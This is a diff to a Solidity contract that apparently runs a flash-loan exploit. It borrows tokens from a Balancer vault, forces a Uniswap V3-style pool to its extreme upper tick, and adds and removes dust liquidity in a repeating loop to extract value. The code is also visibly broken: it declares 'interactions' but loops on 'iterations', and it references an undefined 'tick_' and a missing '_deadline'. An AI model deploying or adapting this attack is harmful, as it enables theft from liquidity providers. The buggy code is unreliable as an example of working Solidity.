@@ -27,6 +27,12 @@ contract main {
     IERC20  token1 = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     //////// CHECK deadline 04/03/2024
     uint deadline = 1709507089;
+    struct PositionForRemove {
+        uint tokenId;
+        uint128 liquidity;
+    }
+    mapping(uint=>PositionForRemove) positionsForRemove;
+    uint counter;
 
 
     function receiveFlashLoan(
@@ -35,10 +41,8 @@ contract main {
         uint256[] memory feeAmounts,
         bytes memory
     ) external {
-        work();
-
-
-
+        work(); 
+        
         for (uint256 i; i < tokens.length; ++i) {
             IERC20 token = tokens[i];
             uint256 amount = amounts[i];
@@ -60,13 +64,30 @@ contract main {
 
         tokens[0] = token1;
         amounts[0] = 100_001 ether;
+        
+        token1.approve(address(manager), type(uint256).max);
+        token0.approve(address(manager), type(uint256).max);
+        token1.approve(address(router), type(uint256).max);
+        token0.approve(address(router), type(uint256).max);
 
-        IBalancerVault(vault).flashLoan(
-            IFlashLoanRecipient(address(this)),
-            tokens,
-            amounts,
-            ""
-        );
+        addLiquidity1000weiOfToken0(deadline);
+    
+        //how many jumps of work you need
+        uint interactions = 3;
+        for(uint i; i<iterations; i++){
+            IBalancerVault(vault).flashLoan(
+                IFlashLoanRecipient(address(this)),
+                tokens,
+                amounts,
+                ""
+            );
+        } 
+        
+
+        
+
+
+
     }
 
     function disadvantage(IERC20 token, uint256 amount) internal {
@@ -81,27 +102,15 @@ contract main {
 
     //SC must has at least 1e18/1e18 of token0/token1  
     function work() public {
-
         //we need approve some amounts of token0
         uint256 swapAmount = 1 ether; 
-
-        token1.approve(address(manager), type(uint256).max);
-        token0.approve(address(manager), type(uint256).max);
-        token1.approve(address(router), type(uint256).max);
-        token0.approve(address(router), type(uint256).max);
-
-        //we can't move price and swap if liquidity == 0
-        if(pool.liquidity()==0) {
-            addLiquidity1000Token0(deadline);
-        }
-
         // SC  must have now 1(1e18) token1 for first swap. 
         // We move price to upper boundary
         swap1ofToken1(deadline);
 
         //check that we are in upper boundary
         (,int24 tick, , , , , ) = pool.slot0();
-        require(tick==887271);
+        require(tick==887271 || tick==887272, "not 887271/72 tick");
 
         // add 100mln token1 for liquidity. 
         // Upper tick 887000  / lower tick 886800 / 
@@ -111,10 +120,21 @@ contract main {
         // for 0.066284551742012943 t0
         finalSwap(deadline, swapAmount);
 
-        //check liquidity value
-        require(pool.liquidity()==0);    
+        //we need remove dust otherwise we can't move tick to upper boundary
+        removeLiquidity();    
     }
 
+    function removeLiquidity() public {
+        manager.decreaseLiquidity(
+            INonfungiblePositionManager.DecreaseLiquidityParams({
+                tokenId: positionsForRemove[counter].tokenId,
+                liquidity: positionsForRemove[counter].liquidity,
+                amount0Min: 0,
+                amount1Min: 0,
+                deadline: _deadline
+            })
+        );
+    }
     function removeLiquidity(uint256 tokenId) external {
 
         /*
@@ -183,8 +203,10 @@ contract main {
         ); 
     }
 
-    function addLiquidity1000Token0(uint256 _deadline) public {
+    function addLiquidity1000weiOfToken0(uint256 _deadline) public {
         (, int24 tick, , , , , ) = pool.slot0();
+        int24 upperTick =  nearestUsableTick(tick_+500, 200);
+        if(upperTick>887200) upperTick=887200;
             (
             uint256 tokenId,
             uint128 liquidity_, 
@@ -195,8 +217,8 @@ contract main {
                         token0: address(token0),
                         token1: address(token1),
                         fee: 10000, 
-                        tickLower: nearestUsableTick(tick+200, 200),  
-                        tickUpper:  nearestUsableTick(tick+500, 200), 
+                        tickLower: nearestUsableTick(upperTick-400, 200),  
+                        tickUpper:  upperTick, 
                         amount0Desired: 1000,
                         amount1Desired: 0,
                         amount0Min: 0,
@@ -229,6 +251,11 @@ contract main {
                         deadline: _deadline
                 })
         );
+        //we need track added liquidity position
+        counter++;
+        PositionForRemove storage newPositionForRemove = positionsForRemove[counter];
+        newPositionForRemove.tokenId = tokenId;
+        newPositionForRemove.liquidity = liquidity;
     }
 
     function finalSwap(uint _deadline, uint _swapAmount) public { 
